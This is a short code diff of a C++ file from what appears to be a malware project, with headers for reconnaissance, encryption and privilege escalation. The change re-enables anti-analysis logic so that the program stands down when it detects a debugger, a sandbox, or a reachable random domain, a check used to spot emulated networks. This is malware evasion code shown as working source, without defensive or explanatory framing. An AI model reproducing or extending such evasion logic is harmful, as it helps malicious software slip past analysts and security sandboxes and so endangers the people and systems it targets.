@@ -1,14 +1,16 @@
 #include "Utils.h"
 #include "evasion\Evasion.h"
+#include "evasion\Sandbox.h"
 #include "Recon.h"
-#include "Privilege_escalation.h"
+#include "Crypt.h"
+#include "privilegeEscalation\PrivilegeEscalation.h"
 
 Evasion::Evasion() {
-    /*	if (Evasion::isBeingDebugging() || Evasion::isDomainReachable()) {
+	Sandbox sandbox;
+
+    if (Evasion::isBeingDebugging() || Evasion::isDomainReachable() || sandbox.DetectSandbox()) {
 		this->mustBeAvoided = TRUE;
 	}
-    */
-
 };
 
 BOOL Evasion::isBeingDebugging(void) {
@@ -21,8 +23,11 @@ BOOL Evasion::isBeingDebugging(void) {
 BOOL Evasion::isDomainReachable(void) {
 	std::string randomDomain = Utils::getRandomDomain();
 
-	if (Utils::hostConnection(randomDomain, 80)) {
+	if (Utils::HostConnection(randomDomain, 80)) {
 		return TRUE;
 	}
 	return FALSE;
 }
+
+
+
